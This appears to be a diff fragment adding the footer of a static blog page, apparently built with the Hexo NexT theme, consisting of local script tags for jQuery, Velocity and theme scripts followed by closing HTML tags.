+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
